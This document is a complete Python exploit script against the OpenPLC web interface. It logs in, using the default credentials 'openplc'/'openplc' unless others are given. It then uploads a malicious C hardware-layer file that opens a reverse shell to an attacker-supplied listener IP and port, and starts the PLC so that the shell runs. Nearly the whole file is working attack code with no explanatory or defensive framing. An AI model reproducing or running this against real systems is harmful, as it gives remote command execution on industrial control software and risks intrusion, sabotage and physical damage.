import sys
import requests
import urllib3
import time
import argparse

cookie = ''

parser = argparse.ArgumentParser()
parser.add_argument('--url', help='URL of the OpenPLC - http(s)://<IP>:<PORT>')
parser.add_argument('--username', help='username', default='openplc')
parser.add_argument('--password', help='Password', default='openplc')
parser.add_argument('--listenerip', help='IP address of the listener', required=True)
parser.add_argument('--listenerport', help='PORT of the listener', required=True)
args = parser.parse_args()

L_IP = args.listenerip
L_PORT = args.listenerport
R_URL = args.url
USERNAME = args.username
PASSWORD = args.password

def get_cookie_header():
    return { "Cookie": cookie }


def login():
    global cookie
    r = requests.post(R_URL + "/login", data={"username": USERNAME, "password": PASSWORD})

    if r.status_code == 200:
        cookie = r.headers['set-cookie']
    else:
        print('Authentication error')
        exit(1)


def upload_c_file():
    c_file = '''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
}

void updateCustomIn()
{
}

void updateCustomOut()
{
    struct sockaddr_in revsockaddr;

    pid_t pid = fork(); // non-blocking mode

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(''' + L_PORT + ''');
    revsockaddr.sin_addr.s_addr = inet_addr("''' + L_IP + '''");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}'''

    fields = {
        "hardware_layer": "blank_linux",
        "custom_layer_code": c_file
    }

    body, header = urllib3.encode_multipart_formdata(fields)
    
    headers = {
        "Cookie": cookie,
        "Content-Type": header
    }

    r = requests.post(R_URL + "/hardware", headers=headers, data=body)
    
    if not r.status_code == 200:
        print('Uploading file error')
        exit(2)


def start_plc():
    r = requests.get(R_URL + "/start_plc", headers=get_cookie_header())

    if not r.status_code == 200:
        print('Starting PLC error')
        exit(3)


def stop_plc():
    r = requests.get(R_URL + "/stop_plc", headers=get_cookie_header(), timeout=5)

    if not r.status_code == 200:
        print('Stopping PLC error')
        exit(4)

login()
print("[*] Authenticated.")
upload_c_file()
print("[*] C file uploaded. Waiting for compilation.")
time.sleep(5)
print("[*] Compiled, probably.")
print("[*] Started PLC, you should get your reverse shell now.")
start_plc()
stop_plc()
print("[*] Stopped PLC.")
